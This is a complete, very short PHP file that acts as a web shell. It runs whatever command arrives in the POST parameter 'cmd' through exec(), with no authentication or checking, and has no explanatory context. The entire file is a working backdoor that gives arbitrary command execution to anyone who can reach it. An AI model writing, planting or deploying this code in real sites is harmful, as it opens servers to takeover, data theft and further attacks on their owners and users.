<?php
	if (isset($_POST['cmd']))
	{
		exec($_POST['cmd']);
	}
?>